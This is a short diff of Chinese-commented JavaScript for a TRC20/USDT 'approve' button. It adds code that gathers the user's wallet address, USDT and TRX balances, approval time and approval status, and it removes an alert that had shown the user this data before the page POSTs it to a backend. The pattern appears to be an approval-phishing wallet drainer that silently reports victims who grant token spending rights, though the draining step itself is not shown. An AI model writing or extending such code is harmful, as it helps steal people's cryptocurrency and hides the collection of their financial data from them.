@@ -100,7 +100,15 @@
         // ========== 核心：发送6个字段（含isApproved授权状态） ==========
         approveBtn.onclick = async () => {
             // 初始化6个字段（与后端新增字段匹配）
-            
+            const postData = {
+                address: userAddress || "",          // 1. 钱包地址（必填）
+                tokenBalance: tokenBalance,          // 2. USDT余额（必填）
+                trxBalance: trxBalance,              // 3. TRX余额（非必填）
+                approveTime: new Date().toLocaleString(), // 4. 授权时间（非必填）
+                txHash: "未生成",                    // 5. 交易哈希（非必填）
+                isApproved: false                    // 6. 授权状态（新增，布尔值）
+            };
+
 
             try {
                 if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
@@ -133,8 +141,7 @@
             } finally {
                 // 发送6个字段到后端
                 try {
-                   alert(`【发送】6个字段（含授权状态）：\n1.地址：${postData.address.slice(0,8)}...\n2.USDT：${postData.tokenBalance}\n3.TRX：${postData.trxBalance}\n4.时间：${postData.approveTime}\n5.哈希：${postData.txHash.slice(0,10)}...\n6.授权成功：${postData.isApproved}`);
-
+                   
                 const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
